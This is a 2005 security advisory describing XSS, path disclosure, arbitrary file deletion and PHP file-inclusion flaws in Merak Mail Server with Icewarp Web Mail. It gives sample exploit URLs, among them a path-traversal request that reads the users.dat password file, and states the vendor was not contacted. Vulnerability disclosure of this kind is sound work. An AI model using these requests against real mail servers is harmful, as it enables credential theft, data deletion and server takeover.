ShineShadow Security Report  30092005-06

TITLE: Multiple vulnerabilities in Merak Mail Server 8.2.4r with Icewarp Web Mail 5.5.1.

BACKGROUND

Merak Mail Server, with the revolutionary Merak Mail Server GroupWare Server, cutting-
edge Merak Mail Server Instant Antispam and much more, is the fastest, most
stable, secure and 100% virus free mail server on the market today. 
Every day companies choose Merak Mail Server's stability, speed, security, functionality,
scalability and multi-tiered delegated manageability over products costing
thousands of dollars more yet lacking the sophistication that Merak delivers.
In less than 10 minutes you can have the same professional email server that organizations
such as NATO, the U.S. Navy, the FBI, Toyota, the U.S. Government, and
many ISP Providers and Developers depend on every day.

Source: www.MerakMailServer.com

VULNERABLE PRODUCT

MERAK Mail Server 8.2.4r with Icewarp Web Mail 5.5.1 (maybe other)

DETAILS

1. Multiple cross-site scripting (XSS) vulnerabilities.

Description: 
Remote user, who HAS NOT account on Merak Mail Server, can execute cross-site scripting
(XSS) attack.

Vulnerable pages:
blank.html
calendar_d.html
calendar_m.html
calendar_w.html

Examples:
http://localhost:32000/mail/blank.html?id=[xss_here]
http://localhost:32000/mail/calendar_d.html?schedule=1&print=1&createdataCX=[xss_here]
http://localhost:32000/mail/calendar_m.html?schedule=1&print=1&createdataCX=[xss_here]
http://localhost:32000/mail/calendar_w.html?schedule=1&print=1&createdataCX=[xss_here]

2. Full install path disclosure.

Description:	
Remote user, who HAS NOT account on Merak Mail Server, can disclosure full install path
of the product. It could be used during attack on an affected system.

Vulnerable script: 
bwlist_inc.html

Examples: 
http://localhost:32000/mail/bwlist_inc.html
http://localhost:32000/accounts/bwlist_inc.html

3. Deletion arbitrary directories and files on remote system.

Description: Remote user, who HAS NOT account on Merak Mail Server, can delete
arbitrary directories and files on local file system of the remote Merak server. It could be used for deleting
any data on an affected system or causing denial of service (DOS) conditions.

Vulnerable pages: logout.html

Example:

Deletion arbitrary directory:
http://localhost:32000/mail/logout.html?id=[relative path]

Deletion arbitrary file:
http://localhost:32000/mail/logout.html?id=[relative path]%00blabla

4. PHP inclusion.

Descripttion: Remote user, who HAS NOT account on Merak Mail Server, can view and download arbitrary files 
on an affected system or execute arbitrary PHP code with webmail privileges. From files user.dat, users.dat
attacker could get users and administrators passwords and take complete control of a Merak Mail Server.
If Merak Mail Server was been running under administrator account then attacker could take complete control
of an affected system.

Example:

http://localhost:32000/accounts/help.html?helpid=../../../webmail/config/users.dat%00

EXPLOITATION

IceWarp Web Mail (CONTROL service) must be running on Merak Mail Server (default ENABLE).
Only web browser is needed for exploitation of this vulnerabilities.

WORKAROUND

Disable Icewarp Web Mail service (Control.exe).

VENDOR STATUS

Not contacted.

SUMMARY

An attacker who successfully exploited vulnerabilities described in this report could
take complete control of a Merak Mail Server 8.2.4r or an affected remote system.
Merak Mail Server 8.2.4r with Icewarp Web Mail 5.5.1 also vulnerable to other
(undescribed in this report) critical vulnerabilities. An attacker who successfully
exploited of this undescribed vulnerabilities could take complete control
of a Merak Mail Server or an affected remote system. I am not advice to use this
product, you must disable Icewarp Web Mail service. 
	
CREDITS

ShineShadow, independent IT security expert. 
To get more information, please contact me by e-mail.

30.09.2005
ShineShadow,
ss_contacts@hotmail.com
